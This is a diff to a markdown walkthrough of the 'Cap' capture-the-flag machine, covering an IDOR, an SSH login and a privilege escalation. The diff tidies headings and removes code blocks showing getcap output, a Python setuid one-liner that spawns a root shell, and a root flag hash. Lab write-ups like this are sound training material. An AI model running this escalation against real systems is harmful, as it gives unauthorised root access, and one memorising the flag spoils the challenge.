@@ -8,8 +8,9 @@ On the webserver, we are able to exploit an *Insecure Direct Object Reference (I
 Using the credentials, we are able to SSH into the machine, and read user.txt. 
 Through automated, local enumeration, we learn a system package is incorrectly configured to allow setuid. Using this knowledge, we are able to exploit the package to get a shell as root – gaining access to root.txt.
 
-**Let's jump in and start to hack !:)
-#Enumeration
+**Let's jump in and start to hack !:).
+
+# Enumeration
 
 We are using network map scanner with aggressive mode recon for service and version number.
 
@@ -87,41 +88,9 @@ We trying and testing manual !
  LinPeas result reveals that ‘cap_setuid’ capability is enabled on python3.8 binary. This simply means, the user has privilege to run this program as root.
 
 https://gtfobins.github.io/gtfobins/python/#capabilities
-```
-nathan@cap:~$ getcap -r / 2>/dev/null
-/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
-/usr/bin/ping = cap_net_raw+ep
-/usr/bin/traceroute6.iputils = cap_net_raw+ep
-/usr/bin/mtr-packet = cap_net_raw+ep
-/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
-
-
-```
 
 <img width="758" height="365" alt="flag2" src="https://github.com/user-attachments/assets/bdac6f58-f0f2-41a0-9071-1819d9869a8f" />
 
-```
-nathan@cap:~$ python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
-# whoami
-root
-# cd /root/
-# ls -la
-total 36
-drwx------  6 root root 4096 Mar  8 23:49 .
-drwxr-xr-x 20 root root 4096 Jun  1  2021 ..
-lrwxrwxrwx  1 root root    9 May 15  2021 .bash_history -> /dev/null
--rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
-drwxr-xr-x  3 root root 4096 May 23  2021 .cache
-drwxr-xr-x  3 root root 4096 May 23  2021 .local
--rw-r--r--  1 root root  161 Dec  5  2019 .profile
-drwx------  2 root root 4096 May 23  2021 .ssh
-lrwxrwxrwx  1 root root    9 May 27  2021 .viminfo -> /dev/null
--r--------  1 root root   33 Mar  8 23:49 root.txt
-drwxr-xr-x  3 root root 4096 May 23  2021 snap
-# cat root.txt
-1d96b9552d8caefcd6e857075c0cc138
-
-```
 
 We got access to root shell and read the root flag.
 
